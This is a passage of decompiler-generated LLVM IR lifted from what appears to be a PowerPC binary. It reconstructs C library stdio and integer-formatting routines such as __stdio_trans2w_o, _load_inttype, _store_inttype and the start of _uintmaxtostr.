  %v1_10011350 = and i16 %v3_1001134c, 512
  %v3_10011350 = icmp eq i16 %v1_10011350, 0
  br i1 %v3_10011350, label %dec_label_pc_10011358, label %dec_label_pc_10011464

dec_label_pc_10011358:                            ; preds = %entry
  %v2_10011358 = add i32 %tmp, 4
  %v3_10011358 = inttoptr i32 %v2_10011358 to i32*
  %v4_10011358 = load i32, i32* %v3_10011358, align 4
  %v2_1001135c = add i32 %tmp, 16
  %v3_1001135c = inttoptr i32 %v2_1001135c to i32*
  %v4_1001135c = load i32, i32* %v3_1001135c, align 4
  store i32 %v4_1001135c, i32* @r3, align 4
  %v3_10011360 = icmp eq i32 %v4_10011358, -2
  %v2_10011364 = add i32 %tmp, 12
  %v3_10011364 = inttoptr i32 %v2_10011364 to i32*
  %v4_10011364 = load i32, i32* %v3_10011364, align 4
  %v2_1001136c = sub i32 %v4_10011364, %v4_1001135c
  br i1 %v3_10011360, label %dec_label_pc_1001136c, label %dec_label_pc_1001139c

dec_label_pc_1001136c:                            ; preds = %dec_label_pc_10011358
  %v3_10011374 = icmp ult i32 %v2_1001136c, %arg2
  br i1 %v3_10011374, label %dec_label_pc_1001137c, label %dec_label_pc_10011380

dec_label_pc_1001137c:                            ; preds = %dec_label_pc_1001136c
  br label %dec_label_pc_10011380

dec_label_pc_10011380:                            ; preds = %dec_label_pc_1001136c, %dec_label_pc_1001137c
  %storemerge = phi i32 [ %v2_1001136c, %dec_label_pc_1001137c ], [ %arg2, %dec_label_pc_1001136c ]
  %v0_10011384 = phi i32 [ %v2_1001136c, %dec_label_pc_1001137c ], [ %arg2, %dec_label_pc_1001136c ]
  store i32 %storemerge, i32* @r31, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v0_10011384, i32* @r5, align 4
  store i32 268505996, i32* @lr, align 4
  %v0_10011388 = call i32 @memcpy()
  %v0_1001138c = load i32, i32* @r30, align 4
  %v1_1001138c = add i32 %v0_1001138c, 16
  %v2_1001138c = inttoptr i32 %v1_1001138c to i32*
  %v3_1001138c = load i32, i32* %v2_1001138c, align 4
  %v1_10011390 = load i32, i32* @r31, align 4
  %v2_10011390 = add i32 %v1_10011390, %v3_1001138c
  store i32 %v2_10011390, i32* %v2_1001138c, align 4
  br label %dec_label_pc_10011484

dec_label_pc_1001139c:                            ; preds = %dec_label_pc_10011358
  %v3_100113a0 = icmp ult i32 %v2_1001136c, %arg2
  br i1 %v3_100113a0, label %dec_label_pc_10011440, label %dec_label_pc_100113a8

dec_label_pc_100113a8:                            ; preds = %dec_label_pc_1001139c
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 268506036, i32* @lr, align 4
  %v0_100113b0 = call i32 @memcpy()
  %v0_100113b4 = load i32, i32* @r30, align 4
  %v1_100113b4 = inttoptr i32 %v0_100113b4 to i16*
  %v2_100113b4 = load i16, i16* %v1_100113b4, align 2
  %v1_100113b8 = add i32 %v0_100113b4, 16
  %v2_100113b8 = inttoptr i32 %v1_100113b8 to i32*
  %v3_100113b8 = load i32, i32* %v2_100113b8, align 4
  %v1_100113bc = and i16 %v2_100113b4, 256
  %v3_100113bc = icmp eq i16 %v1_100113bc, 0
  %v1_100113c0 = load i32, i32* @r29, align 4
  %v2_100113c0 = add i32 %v1_100113c0, %v3_100113b8
  store i32 %v2_100113c0, i32* %v2_100113b8, align 4
  br i1 %v3_100113bc, label %dec_label_pc_10011484, label %dec_label_pc_100113cc

dec_label_pc_100113cc:                            ; preds = %dec_label_pc_100113a8
  %v0_100113cc = load i32, i32* @r28, align 4
  %v0_100113d4 = load i32, i32* @r29, align 4
  store i32 268506076, i32* @lr, align 4
  %v4_100113d8 = call i32 @memrchr(i32 %v0_100113cc, i32 10, i32 %v0_100113d4, i32 %v2_100113c0)
  %v3_100113dc = icmp eq i32 %v4_100113d8, 0
  br i1 %v3_100113dc, label %dec_label_pc_10011484, label %dec_label_pc_100113e4

dec_label_pc_100113e4:                            ; preds = %dec_label_pc_100113cc
  %v0_100113e4 = load i32, i32* @r30, align 4
  store i32 %v0_100113e4, i32* @r3, align 4
  store i32 268506092, i32* @lr, align 4
  %v0_100113e8 = call i32 @__stdio_wcommit()
  %v3_100113ec = icmp eq i32 %v0_100113e8, 0
  br i1 %v3_100113ec, label %dec_label_pc_10011484, label %dec_label_pc_100113f4

dec_label_pc_100113f4:                            ; preds = %dec_label_pc_100113e4
  %v0_100113f4 = load i32, i32* @r29, align 4
  %v3_100113f4 = icmp ugt i32 %v0_100113f4, %v0_100113e8
  %v0_100113e8.v0_100113f8 = select i1 %v3_100113f4, i32 %v0_100113e8, i32 %v0_100113f4
  store i32 %v0_100113e8.v0_100113f8, i32* @r31, align 4
  %v2_10011404 = sub i32 %v0_100113f4, %v0_100113e8.v0_100113f8
  %v0_1001140c = load i32, i32* @r28, align 4
  %v2_1001140c = add i32 %v0_1001140c, %v2_10011404
  store i32 %v2_1001140c, i32* @r28, align 4
  store i32 %v2_1001140c, i32* @r3, align 4
  store i32 268506140, i32* @lr, align 4
  %v3_10011418 = call i32 @__GI_memchr(i32 %v2_1001140c, i32 10, i32 %v0_100113e8.v0_100113f8)
  %v3_1001141c = icmp eq i32 %v3_10011418, 0
  br i1 %v3_1001141c, label %dec_label_pc_10011484, label %dec_label_pc_10011424

dec_label_pc_10011424:                            ; preds = %dec_label_pc_100113f4
  %v0_10011424 = load i32, i32* @r30, align 4
  %v1_10011424 = add i32 %v0_10011424, 16
  %v2_10011424 = inttoptr i32 %v1_10011424 to i32*
  %v3_10011424 = load i32, i32* %v2_10011424, align 4
  %v0_10011428 = load i32, i32* @r28, align 4
  %v1_10011428 = load i32, i32* @r31, align 4
  %v2_10011428 = sub i32 %v0_10011428, %v3_10011418
  %v2_1001142c = add i32 %v2_10011428, %v1_10011428
  %v2_10011430 = sub i32 %v3_10011424, %v2_1001142c
  %v1_10011434 = load i32, i32* @r29, align 4
  %v2_10011434 = sub i32 %v1_10011434, %v2_1001142c
  store i32 %v2_10011434, i32* @r29, align 4
  store i32 %v2_10011430, i32* %v2_10011424, align 4
  br label %dec_label_pc_10011484

dec_label_pc_10011440:                            ; preds = %dec_label_pc_1001139c
  %v2_10011440 = add i32 %tmp, 8
  %v3_10011440 = inttoptr i32 %v2_10011440 to i32*
  %v4_10011440 = load i32, i32* %v3_10011440, align 4
  %v4_10011444 = icmp eq i32 %v4_1001135c, %v4_10011440
  br i1 %v4_10011444, label %dec_label_pc_10011464, label %dec_label_pc_1001144c

dec_label_pc_1001144c:                            ; preds = %dec_label_pc_10011440
  store i32 %tmp, i32* @r3, align 4
  store i32 268506196, i32* @lr, align 4
  %v0_10011450 = call i32 @__stdio_wcommit()
  %v3_10011454 = icmp eq i32 %v0_10011450, 0
  br i1 %v3_10011454, label %dec_label_pc_1001144c.dec_label_pc_10011464_crit_edge, label %dec_label_pc_1001145c

dec_label_pc_1001144c.dec_label_pc_10011464_crit_edge: ; preds = %dec_label_pc_1001144c
  %v0_10011468.pre = load i32, i32* @r30, align 4
  %v0_1001146c.pre = load i32, i32* @r28, align 4
  %v0_10011470.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10011464

dec_label_pc_1001145c:                            ; preds = %dec_label_pc_1001144c
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_10011484

dec_label_pc_10011464:                            ; preds = %dec_label_pc_1001144c.dec_label_pc_10011464_crit_edge, %entry, %dec_label_pc_10011440
  %v0_10011470 = phi i32 [ %v0_10011470.pre, %dec_label_pc_1001144c.dec_label_pc_10011464_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_10011440 ]
  %v0_1001146c = phi i32 [ %v0_1001146c.pre, %dec_label_pc_1001144c.dec_label_pc_10011464_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_10011440 ]
  %v0_10011468 = phi i32 [ %v0_10011468.pre, %dec_label_pc_1001144c.dec_label_pc_10011464_crit_edge ], [ %tmp, %entry ], [ %tmp, %dec_label_pc_10011440 ]
  %v1_10011468 = inttoptr i32 %v0_10011468 to i16*
  store i32 %v0_10011470, i32* @r5, align 4
  store i32 %v0_10011330, i32* @lr, align 4
  %v5_10011480 = call i32 @__stdio_WRITE(i16* %v1_10011468, i32 %v0_1001146c)
  br label %dec_label_pc_10011484

dec_label_pc_10011484:                            ; preds = %dec_label_pc_100113f4, %dec_label_pc_100113e4, %dec_label_pc_100113cc, %dec_label_pc_100113a8, %dec_label_pc_1001145c, %dec_label_pc_10011424, %dec_label_pc_10011380, %dec_label_pc_10011464
  %v0_10011488 = load i32, i32* @r29, align 4
  ret i32 %v0_10011488

; uselistorder directives
  uselistorder i32 %v2_1001142c, { 1, 0 }
  uselistorder i32 %v0_100113e8.v0_100113f8, { 0, 2, 1 }
  uselistorder i32 %v0_100113f4, { 1, 0, 2 }
  uselistorder i32 %v2_1001136c, { 3, 0, 1, 2 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_10011484, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_10011464, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10011380, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_1001149c = load i32, i32* @lr, align 4
  store i32 %v0_1001149c, i32* %r0.global-to-local, align 4
  %v0_100114a4 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_100114b0 = load i16, i16* %arg1, align 2
  %v4_100114b0 = zext i16 %v3_100114b0 to i32
  store i32 %v4_100114b0, i32* %r0.global-to-local, align 4
  %v1_100114b4 = load i32, i32* @r4, align 4
  %v2_100114b4 = and i32 %v1_100114b4, %v4_100114b0
  store i32 %v2_100114b4, i32* %r9.global-to-local, align 4
  %v5_100114b4 = icmp eq i32 %v2_100114b4, 0
  br i1 %v5_100114b4, label %dec_label_pc_100114bc, label %dec_label_pc_100114cc

dec_label_pc_100114bc:                            ; preds = %entry
  %v1_100114bc = and i32 %v4_100114b0, 2176
  store i32 %v1_100114bc, i32* %r9.global-to-local, align 4
  %v3_100114bc = icmp eq i32 %v1_100114bc, 0
  br i1 %v3_100114bc, label %dec_label_pc_100114c4, label %dec_label_pc_100114d8

dec_label_pc_100114c4:                            ; preds = %dec_label_pc_100114bc
  %v2_100114c4 = or i32 %v1_100114b4, %v4_100114b0
  store i32 %v2_100114c4, i32* %r0.global-to-local, align 4
  %v1_100114c8 = trunc i32 %v2_100114c4 to i16
  store i16 %v1_100114c8, i16* %arg1, align 2
  %v0_100114cc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100114cc

dec_label_pc_100114cc:                            ; preds = %entry, %dec_label_pc_100114c4
  %v0_10011508 = phi i32 [ %tmp, %entry ], [ %v0_100114cc.pre, %dec_label_pc_100114c4 ]
  %v1_100114cc = inttoptr i32 %v0_10011508 to i16*
  %v2_100114cc = load i16, i16* %v1_100114cc, align 2
  %v3_100114cc = zext i16 %v2_100114cc to i32
  %v1_100114d0 = and i32 %v3_100114cc, 32
  store i32 %v1_100114d0, i32* %r0.global-to-local, align 4
  %v3_100114d0 = icmp eq i32 %v1_100114d0, 0
  br i1 %v3_100114d0, label %dec_label_pc_100114f8, label %dec_label_pc_100114d8

dec_label_pc_100114d8:                            ; preds = %dec_label_pc_100114bc, %dec_label_pc_100114cc
  %v0_100114d8 = call i32 @__errno_location()
  store i32 %v0_100114d8, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v2_100114e0 = inttoptr i32 %v0_100114d8 to i32*
  store i32 9, i32* %v2_100114e0, align 4
  br label %dec_label_pc_100114e4

dec_label_pc_100114e4:                            ; preds = %dec_label_pc_10011520, %dec_label_pc_100114d8
  %v0_100114e4 = load i32, i32* @r31, align 4
  %v1_100114e4 = inttoptr i32 %v0_100114e4 to i16*
  %v2_100114e4 = load i16, i16* %v1_100114e4, align 2
  %v3_100114e4 = zext i16 %v2_100114e4 to i32
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_100114ec = or i32 %v3_100114e4, 8
  store i32 %v1_100114ec, i32* %r0.global-to-local, align 4
  %v1_100114f0 = trunc i32 %v1_100114ec to i16
  store i16 %v1_100114f0, i16* %v1_100114e4, align 2
  br label %dec_label_pc_10011580

dec_label_pc_100114f8:                            ; preds = %dec_label_pc_100114cc
  %tmp8 = urem i16 %v2_100114cc, 4
  %v1_100114f8 = zext i16 %tmp8 to i32
  store i32 %v1_100114f8, i32* %r0.global-to-local, align 4
  %v3_100114f8 = icmp eq i16 %tmp8, 0
  br i1 %v3_100114f8, label %dec_label_pc_1001155c, label %dec_label_pc_10011500

dec_label_pc_10011500:                            ; preds = %dec_label_pc_100114f8
  %v1_10011500 = and i32 %v3_100114cc, 4
  store i32 %v1_10011500, i32* %r9.global-to-local, align 4
  %v3_10011500 = icmp eq i32 %v1_10011500, 0
  br i1 %v3_10011500, label %dec_label_pc_10011508, label %dec_label_pc_10011540

dec_label_pc_10011508:                            ; preds = %dec_label_pc_10011500
  %v1_10011508 = add i32 %v0_10011508, 20
  %v2_10011508 = inttoptr i32 %v1_10011508 to i32*
  %v3_10011508 = load i32, i32* %v2_10011508, align 4
  store i32 %v3_10011508, i32* %r0.global-to-local, align 4
  %v1_1001150c = add i32 %v0_10011508, 16
  %v2_1001150c = inttoptr i32 %v1_1001150c to i32*
  %v3_1001150c = load i32, i32* %v2_1001150c, align 4
  store i32 %v3_1001150c, i32* %r9.global-to-local, align 4
  %v4_10011510 = icmp eq i32 %v3_10011508, %v3_1001150c
  br i1 %v4_10011510, label %dec_label_pc_10011518, label %dec_label_pc_10011520

dec_label_pc_10011518:                            ; preds = %dec_label_pc_10011508
  %v1_10011518 = and i32 %v3_100114cc, 2
  store i32 %v1_10011518, i32* %r0.global-to-local, align 4
  %v3_10011518 = icmp eq i32 %v1_10011518, 0
  br i1 %v3_10011518, label %dec_label_pc_10011540, label %dec_label_pc_10011520

dec_label_pc_10011520:                            ; preds = %dec_label_pc_10011508, %dec_label_pc_10011518
  %v1_10011520 = and i32 %v3_100114cc, 1024
  store i32 %v1_10011520, i32* %r9.global-to-local, align 4
  %v0_10011528 = call i32 @__asm_mfcr()
  store i32 %v0_10011528, i32* %r3.global-to-local, align 4
  %v1_1001152c = call i32 @__asm_rlwinm(i32 %v0_10011528, i32 3, i32 31, i32 31)
  %v1_10011530 = sub i32 2, %v1_1001152c
  store i32 %v1_10011530, i32* @r5, align 4
  store i32 268506424, i32* @lr, align 4
  %v1_10011534 = call i32 @__GI_fseek(i32 %v1_10011530)
  store i32 %v1_10011534, i32* %r3.global-to-local, align 4
  %v3_10011538 = icmp eq i32 %v1_10011534, 0
  br i1 %v3_10011538, label %dec_label_pc_10011520.dec_label_pc_10011540_crit_edge, label %dec_label_pc_100114e4

dec_label_pc_10011520.dec_label_pc_10011540_crit_edge: ; preds = %dec_label_pc_10011520
  %v0_10011540.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10011540

dec_label_pc_10011540:                            ; preds = %dec_label_pc_10011520.dec_label_pc_10011540_crit_edge, %dec_label_pc_10011500, %dec_label_pc_10011518
  %v0_10011540 = phi i32 [ %v0_10011540.pre, %dec_label_pc_10011520.dec_label_pc_10011540_crit_edge ], [ %v0_10011508, %dec_label_pc_10011500 ], [ %v0_10011508, %dec_label_pc_10011518 ]
  %v1_10011540 = inttoptr i32 %v0_10011540 to i16*
  %v2_10011540 = load i16, i16* %v1_10011540, align 2
  %v3_10011540 = zext i16 %v2_10011540 to i32
  store i32 %v3_10011540, i32* %r0.global-to-local, align 4
  %v1_10011544 = add i32 %v0_10011540, 8
  %v2_10011544 = inttoptr i32 %v1_10011544 to i32*
  %v3_10011544 = load i32, i32* %v2_10011544, align 4
  store i32 %v3_10011544, i32* %r9.global-to-local, align 4
  %v1_10011548 = call i32 @__asm_rlwinm(i32 %v3_10011540, i32 0, i32 0, i32 29)
  %v2_10011548 = trunc i32 %v1_10011548 to i16
  store i32 %v1_10011548, i32* %r0.global-to-local, align 4
  %v3_1001154c = load i32, i32* @r31, align 4
  %v4_1001154c = inttoptr i32 %v3_1001154c to i16*
  store i16 %v2_10011548, i16* %v4_1001154c, align 2
  %v0_10011550 = load i32, i32* %r9.global-to-local, align 4
  %v1_10011550 = load i32, i32* @r31, align 4
  %v2_10011550 = add i32 %v1_10011550, 20
  %v3_10011550 = inttoptr i32 %v2_10011550 to i32*
  store i32 %v0_10011550, i32* %v3_10011550, align 4
  %v0_10011554 = load i32, i32* %r9.global-to-local, align 4
  %v1_10011554 = load i32, i32* @r31, align 4
  %v2_10011554 = add i32 %v1_10011554, 24
  %v3_10011554 = inttoptr i32 %v2_10011554 to i32*
  store i32 %v0_10011554, i32* %v3_10011554, align 4
  %v0_10011558 = load i32, i32* %r9.global-to-local, align 4
  %v1_10011558 = load i32, i32* @r31, align 4
  %v2_10011558 = add i32 %v1_10011558, 16
  %v3_10011558 = inttoptr i32 %v2_10011558 to i32*
  store i32 %v0_10011558, i32* %v3_10011558, align 4
  %v0_1001155c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001155c

dec_label_pc_1001155c:                            ; preds = %dec_label_pc_100114f8, %dec_label_pc_10011540
  %v2_10011568 = phi i32 [ %v0_10011508, %dec_label_pc_100114f8 ], [ %v0_1001155c.pre, %dec_label_pc_10011540 ]
  %v1_1001155c = inttoptr i32 %v2_10011568 to i16*
  %v2_1001155c = load i16, i16* %v1_1001155c, align 2
  %v3_1001155c = zext i16 %v2_1001155c to i32
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10011564 = or i32 %v3_1001155c, 64
  store i32 %v1_10011564, i32* %r0.global-to-local, align 4
  %v1_10011568 = trunc i32 %v1_10011564 to i16
  store i16 %v1_10011568, i16* %v1_1001155c, align 2
  %v0_1001156c = load i32, i32* %r0.global-to-local, align 4
  %v1_1001156c = urem i32 %v0_1001156c, 65536
  store i32 %v1_1001156c, i32* %r0.global-to-local, align 4
  %v1_10011570 = and i32 %v0_1001156c, 2816
  store i32 %v1_10011570, i32* %r9.global-to-local, align 4
  %v3_10011570 = icmp eq i32 %v1_10011570, 0
  br i1 %v3_10011570, label %dec_label_pc_10011578, label %dec_label_pc_10011580

dec_label_pc_10011578:                            ; preds = %dec_label_pc_1001155c
  %v0_10011578 = load i32, i32* @r31, align 4
  %v1_10011578 = add i32 %v0_10011578, 12
  %v2_10011578 = inttoptr i32 %v1_10011578 to i32*
  %v3_10011578 = load i32, i32* %v2_10011578, align 4
  store i32 %v3_10011578, i32* %r0.global-to-local, align 4
  %v2_1001157c = add i32 %v0_10011578, 28
  %v3_1001157c = inttoptr i32 %v2_1001157c to i32*
  store i32 %v3_10011578, i32* %v3_1001157c, align 4
  br label %dec_label_pc_10011580

dec_label_pc_10011580:                            ; preds = %dec_label_pc_1001155c, %dec_label_pc_100114e4, %dec_label_pc_10011578
  store i32 %v0_1001149c, i32* %r0.global-to-local, align 4
  store i32 %v0_100114a4, i32* @r31, align 4
  %v0_10011590 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10011590

; uselistorder directives
  uselistorder i32 %v0_1001156c, { 1, 0 }
  uselistorder i32 %v1_10011548, { 1, 0 }
  uselistorder i32 %v0_10011540, { 1, 0 }
  uselistorder i32 %v0_10011508, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v4_100114b0, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 4, 2, 3, 1, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15 }
  uselistorder i32 1024, { 4, 5, 6, 7, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_10011580, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001155c, { 1, 0 }
  uselistorder label %dec_label_pc_10011540, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10011520, { 1, 0 }
  uselistorder label %dec_label_pc_100114d8, { 1, 0 }
  uselistorder label %dec_label_pc_100114cc, { 1, 0 }
}

define i32 @_load_inttype(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v0_10011594 = load i32, i32* @r5, align 4
  %v1_10011594 = icmp slt i32 %v0_10011594, 0
  %v1_10011598 = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 20, i32 20)
  %v3_100115d4 = icmp eq i32 %v1_10011598, 0
  br i1 %v1_10011594, label %dec_label_pc_100115d4, label %dec_label_pc_100115a0

dec_label_pc_100115a0:                            ; preds = %entry
  br i1 %v3_100115d4, label %dec_label_pc_100115a8, label %dec_label_pc_100115dc

dec_label_pc_100115a8:                            ; preds = %dec_label_pc_100115a0
  %v3_100115a8 = icmp eq i32 %arg1, 256
  br i1 %v3_100115a8, label %dec_label_pc_100115b4, label %dec_label_pc_100115bc

dec_label_pc_100115b4:                            ; preds = %dec_label_pc_100115a8
  br label %dec_label_pc_100115c8

dec_label_pc_100115bc:                            ; preds = %dec_label_pc_100115a8
  %v3_100115bc = icmp eq i32 %arg1, 512
  br i1 %v3_100115bc, label %dec_label_pc_100115c4, label %dec_label_pc_100115c8

dec_label_pc_100115c4:                            ; preds = %dec_label_pc_100115bc
  br label %dec_label_pc_100115c8

dec_label_pc_100115c8:                            ; preds = %dec_label_pc_100115bc, %dec_label_pc_100115b4, %dec_label_pc_100115c4
  ret i32 0

dec_label_pc_100115d4:                            ; preds = %entry
  br i1 %v3_100115d4, label %dec_label_pc_100115e8, label %dec_label_pc_100115dc

dec_label_pc_100115dc:                            ; preds = %dec_label_pc_100115a0, %dec_label_pc_100115d4
  %v2_100115dc = load i32, i32* %arg2, align 4
  ret i32 %v2_100115dc

dec_label_pc_100115e8:                            ; preds = %dec_label_pc_100115d4
  %v3_100115e8 = icmp eq i32 %arg1, 256
  %v2_100115ec = load i32, i32* %arg2, align 4
  br i1 %v3_100115e8, label %dec_label_pc_100115f4, label %dec_label_pc_100115fc

dec_label_pc_100115f4:                            ; preds = %dec_label_pc_100115e8
  %v1_100115f4 = urem i32 %v2_100115ec, 256
  br label %dec_label_pc_10011608

dec_label_pc_100115fc:                            ; preds = %dec_label_pc_100115e8
  %v3_100115fc = icmp eq i32 %arg1, 512
  br i1 %v3_100115fc, label %dec_label_pc_10011604, label %dec_label_pc_10011608

dec_label_pc_10011604:                            ; preds = %dec_label_pc_100115fc
  %v1_10011604 = mul i32 %v2_100115ec, 65536
  %v2_10011604 = sdiv i32 %v1_10011604, 65536
  br label %dec_label_pc_10011608

dec_label_pc_10011608:                            ; preds = %dec_label_pc_100115fc, %dec_label_pc_100115f4, %dec_label_pc_10011604
  %v0_10011608 = phi i32 [ %v2_100115ec, %dec_label_pc_100115fc ], [ %v1_100115f4, %dec_label_pc_100115f4 ], [ %v2_10011604, %dec_label_pc_10011604 ]
  %tmp = icmp slt i32 %v0_10011608, 0
  %v1_1001160c = zext i1 %tmp to i32
  %v2_1001160c = ashr i32 %v0_10011608, 31
  %v3_1001160c = and i32 %v2_1001160c, -2
  %v4_1001160c = or i32 %v3_1001160c, %v1_1001160c
  ret i32 %v4_1001160c

; uselistorder directives
  uselistorder i32 %v0_10011608, { 1, 0 }
  uselistorder i32 %v2_100115ec, { 2, 0, 1 }
  uselistorder i1 %v3_100115d4, { 1, 0 }
  uselistorder i32 %arg1, { 3, 4, 0, 2, 1 }
  uselistorder label %dec_label_pc_10011608, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100115dc, { 1, 0 }
  uselistorder label %dec_label_pc_100115c8, { 2, 0, 1 }
}

define i32 @_store_inttype(i16* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_10011614 = load i32, i32* @r4, align 4
  %v3_10011614 = icmp eq i32 %v0_10011614, 256
  br i1 %v3_10011614, label %dec_label_pc_10011620, label %dec_label_pc_10011628

dec_label_pc_10011620:                            ; preds = %entry
  %v0_10011620 = load i32, i32* @r6, align 4
  %v1_10011620 = trunc i32 %v0_10011620 to i8
  %tmp1 = bitcast i16* %arg1 to i8*
  store i8 %v1_10011620, i8* %tmp1, align 1
  ret i32 %tmp

dec_label_pc_10011628:                            ; preds = %entry
  %v3_10011618 = icmp eq i32 %v0_10011614, 2048
  br i1 %v3_10011618, label %dec_label_pc_10011630, label %dec_label_pc_1001163c

dec_label_pc_10011630:                            ; preds = %dec_label_pc_10011628
  %v0_10011630 = load i32, i32* @r5, align 4
  %tmp2 = bitcast i16* %arg1 to i32*
  store i32 %v0_10011630, i32* %tmp2, align 4
  %v0_10011634 = load i32, i32* @r6, align 4
  %v3_10011634 = add i32 %tmp, 4
  %v4_10011634 = inttoptr i32 %v3_10011634 to i32*
  store i32 %v0_10011634, i32* %v4_10011634, align 4
  ret i32 %tmp

dec_label_pc_1001163c:                            ; preds = %dec_label_pc_10011628
  %v3_10011628 = icmp eq i32 %v0_10011614, 512
  %v0_10011640 = load i32, i32* @r6, align 4
  br i1 %v3_10011628, label %dec_label_pc_10011640, label %dec_label_pc_10011648

dec_label_pc_10011640:                            ; preds = %dec_label_pc_1001163c
  %v1_10011640 = trunc i32 %v0_10011640 to i16
  store i16 %v1_10011640, i16* %arg1, align 2
  ret i32 %tmp

dec_label_pc_10011648:                            ; preds = %dec_label_pc_1001163c
  %tmp3 = bitcast i16* %arg1 to i32*
  store i32 %v0_10011640, i32* %tmp3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i16* %arg1, { 3, 2, 0, 1, 4 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* @r7, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_10011650 = load i32, i32* @r7, align 4
  %v3_10011650 = icmp eq i32 %v0_10011650, 0
  store i1 %v3_10011650, i1* %cr0_eq.global-to-local, align 1
  store i32 %arg5, i32* @r30, align 4
  %tmp12 = icmp sgt i32 %v0_10011650, -1
  br i1 %tmp12, label %dec_label_pc_10011684, label %dec_label_pc_10011664

dec_label_pc_10011664:                            ; preds = %entry
  %v0_10011664 = load i32, i32* %r5.global-to-local, align 4
  %v1_10011668 = sub i32 0, %v0_10011650
  store i32 %v1_10011668, i32* @r7, align 4
  %tmp13 = icmp sgt i32 %v0_10011664, -1
  br i1 %tmp13, label %dec_label_pc_10011684, label %dec_label_pc_10011670

dec_label_pc_10011670:                            ; preds = %dec_label_pc_10011664
  %v0_10011670 = load i32, i32* %r6.global-to-local, align 4
  %v1_10011670 = sub i32 0, %v0_10011670
  %v2_10011670 = sub i32 -1, %v0_10011670
  store i32 %v1_10011670, i32* %r6.global-to-local, align 4
  %v4_10011670 = icmp uge i32 %v2_10011670, %v1_10011670
  %v1_10011674 = sub i32 -1, %v0_10011664
  %v3_10011674 = zext i1 %v4_10011670 to i32
  %v4_10011674 = add i32 %v3_10011674, %v1_10011674
  store i32 %v4_10011674, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10011684

dec_label_pc_10011684:                            ; preds = %entry, %dec_label_pc_10011664, %dec_label_pc_10011670
  %v1_10011688 = phi i32 [ %v1_10011668, %dec_label_pc_10011670 ], [ %v1_10011668, %dec_label_pc_10011664 ], [ %v0_10011650, %entry ]
  %storemerge = phi i32 [ 1, %dec_label_pc_10011670 ], [ 0, %dec_label_pc_10011664 ], [ 0, %entry ]
  store i32 %storemerge, i32* @r29, align 4
  %v2_10011688 = udiv i32 -1, %v1_10011688
  store i32 %v2_10011688, i32* @r8, align 4
  %v2_10011690 = load i32, i32* %r3.global-to-local, align 4
  %v3_10011690 = inttoptr i32 %v2_10011690 to i8*
  store i8 0, i8* %v3_10011690, align 1
  %v0_10011694 = load i32, i32* @r8, align 4
  %v1_10011694 = load i32, i32* @r7, align 4
  %v2_10011694 = mul i32 %v1_10011694, %v0_10011694
  %v1_10011698 = sub i32 0, %v2_10011694
  store i32 %v1_10011698, i32* @r31, align 4
  %v4_1001169c = icmp eq i32 %v1_10011694, %v1_10011698
  br i1 %v4_1001169c, label %dec_label_pc_100116a4, label %dec_label_pc_100116ac

dec_label_pc_100116a4:                            ; preds = %dec_label_pc_10011684
  %v1_100116a4 = add i32 %v0_10011694, 1
  store i32 %v1_100116a4, i32* @r8, align 4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_100116ac

dec_label_pc_100116ac:                            ; preds = %dec_label_pc_10011684, %dec_label_pc_100116a4
  %v0_100116ac = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_100116ac, i32* %r12.global-to-local, align 4
  br label %dec_label_pc_100116b0

dec_label_pc_100116b0thread-pre-split:            ; preds = %dec_label_pc_10011704
  %v0_100116b0.pr = load i32, i32* %r12.global-to-local, align 4
  %v1_100116b4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_100116b0

